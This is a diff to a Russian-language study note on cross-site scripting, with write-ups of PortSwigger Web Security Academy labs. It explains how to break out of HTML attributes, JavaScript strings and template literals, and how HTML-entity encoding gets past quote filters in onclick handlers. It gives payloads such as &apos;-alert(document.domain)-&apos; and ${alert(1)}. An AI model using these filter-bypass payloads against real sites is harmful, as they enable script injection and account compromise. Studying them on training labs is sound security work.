@@ -1,4 +1,27 @@
+[[#XSS между HTML тегами]]
+	[[#Пример Lab Reflected XSS into HTML context with most tags and attributes blocked]]
+	[[#Lab Reflected XSS into HTML context with all tags blocked except custom ones]]
+	[[#Пример Lab Reflected XSS with some SVG markup allowed]]
+	[[#Пример Lab Reflected XSS with event handlers and `href` attributes blocked]]
+[[#XSS в атрибутах и HTML тегах]]
+	[[#Пример Lab Reflected XSS into attribute with angle brackets HTML-encoded]]
+	[[#Пример Lab Stored XSS into anchor `href` attribute with double quotes HTML-encoded]]
+	[[#Пример Lab Reflected XSS in canonical link tag]]
+[[#XSS внутри JavaScript]]
+	[[#Завершение существующего скрипта]]
+		[[#Пример Lab Reflected XSS into a JavaScript string with single quote and backslash escaped]]
+	[[#Выход из строкового литерала JavaScript]]
+		[[#Пример Lab Reflected XSS into a JavaScript string with angle brackets HTML encoded]]
+		[[#Пример Lab Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped]]
+	[[#Вызов функций без скобок в JS]]
+		[[#Пример Lab Reflected XSS in a JavaScript URL with some characters blocked]]
+[[#Использование HTML кодирования]]
+	[[#Пример Lab Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped]]
+[[#XSS в шаблонных литералах JavaScript]]
+	[[#Пример Lab Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped]]
+[[#XSS через инъекцию клиентских шаблонов]]
 
+---
 При тестировании Reflected и Stored XSS ключевая задача это определить контекст возникновения уязвимости.
 
 - Местоположение внутри ответа, где появляются данные, контролируемые атакующим.
@@ -71,7 +94,7 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-han
 # Пример Lab: Reflected XSS into attribute with angle brackets HTML-encoded
 Для решения необходимо найти в каком контексте возникает уязвимость, в лабе указано что что она должна быть в атрибуте, и контекст возникновения получается такой: 
 
-```
+```html
 <section class=blog-header>
 	<h1>0 search results for '&quot; autofocus onfocus=alert(1) x&quot;'</h1>
 	    <hr>
@@ -265,3 +288,86 @@ toString=a,windows+'',
 После чего решение засчитывается.
 
 ---
+# Использование HTML кодирования 
+Когда контекст XSS это существующий JavaScript внутри заключенного в кавычки атрибута тега(например, обработчика события), можно использовать HTML кодирование для обхода некоторых фильтров ввода
+
+Когда браузер разобрал HTML-теги и атрибуты внутри ответа, он выполняет HTML декодирование значений атрибутов, тегов до их дальнейшей обработки. Если серверное приложение блокирует или санитизирует некоторые символы, необходимые для успешной XSS эксплуатации, нередко можно обойти проверку, закодировав эти символы в HTML сущности.
+
+Например, если контекст XSS следующий: 
+
+```
+<a href="#" onclick="... var input='controllable data here'; ...">
+```
+
+И приложение блокирует или экранирует одиночные кавычки, вы можете использовать такую полезную нагрузку, чтобы вырваться из строкового литерала JavaScript и выполнить свой скрипт:
+
+```
+&apos;-alert(document.domain)-&apos;
+```
+
+Последовательность `&apos;` - это HTML-сущность представляющая собой апостроф или одиночную кавычку. Поскольку браузер HTML декодирует значение атрибута `onclick` до интерпретации JavaScript, сущности декодируются в кавычки, которые становятся разделителями строк и атака срабатывает 
+# Пример Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+Для решения необходимо вызвать `alert` при нажатии на имя пользователя, для этого нужно использовать html кодирование за счет которого мы вызовем функцию, для этого
+
+```html
+<a id="author" href="http://0a83009d03b8721280980de700a80075.web-security-academy.net/?(input here)" onclick="var tracker={track(){}};tracker.track('http://0a83009d03b8721280980de700a80075.web-security-academy.net/(input here)">1231</a>
+```
+
+В результате нам необходимо использовать пейлоад который в oneclick исполнится как JS но при этом его должна пустить фильтрация, для этого используем пейлоад из теории
+
+```
+&apos;-alert(document.domain)-&apos;
+```
+
+Он сработает потому что получим в результате следующее 
+
+```html
+<a id="author" href="http://0a83009d03b8721280980de700a80075.web-security-academy.net/?'-alert(document.domain)-'" onclick="var tracker={track(){}};tracker.track('http://0a83009d03b8721280980de700a80075.web-security-academy.net/?'-alert(document.domain)-'');">1231</a>
+```
+
+Он разбивает строку на выражение вида `"something'-alert(document.domain)-''` то есть заставляет считать выражение, а в результате счета получаем побочное исполнение функции `alert` и решаем лабораторную
+
+---
+## XSS в шаблонных литералах JavaScript
+Шаблонные литералы JavaScript это строковые литералы, допускающие встраивание JavaScript выражений. встроенные выражения вычисляются и обычно конкатенируются с окружающим текстом. Шаблонные литералы заключаются в обратные апострофы вместо обычных кавычек, а встроенные выражения обозначаются синтаксисом `${...}`
+
+Например, следующий скрипт выведет приветственное сообщение, включающее отображаемое имя пользователя:
+
+```
+document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
+```
+
+Когда контекст XSS внутри шаблонного литерала JavaScript, нет необходимости завершать литерал. Вместо этого достаточно использовать синтаксис `${...}` чтобы встроить JavaScript выражение, которое будет выполнено при обработке литерала. Например если контекст XSS следующий:
+
+``` html
+<script>
+...
+var input = `controllable data here`;
+...
+</script>
+```
+
+То вы можете использовать такую полезную нагрузку, чтобы выполнить JavaScript, не завершая шаблонный литерал:
+
+```js
+${alert(document.domain)}
+```
+# Пример Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+Для решения необходимо вызвать `alert` в функционале поиска, для этого мы должны использовать шаблонный литерал js, в лабе XSS возникает в это месте
+
+```js
+var message = `0 search results for 'input here'`;
+document.getElementById('searchMessage').innerText = message;
+```
+
+Ввод экранирует `' "` но не экранирует `${}`, что дает поверхность атаки с помощью литерала, для этого мы используем выражение из теории 
+
+```js
+${alert(1)}
+```
+
+После чего вызывается alert и лабораторная засчитывается 
+
+---
+# XSS через инъекцию клиентских шаблонов [[Client-Side Template Injection]]
+Некоторые сайты используют клиентские шаблонные фреймворки, например AngularJS, для динамической отрисовки веб-страниц. Если они внедряют пользовательский ввод в эти шаблоны небезопасным образом, атакующий может внедрять собственные вредоносные выражения шаблонов, запускающие XSS атаку
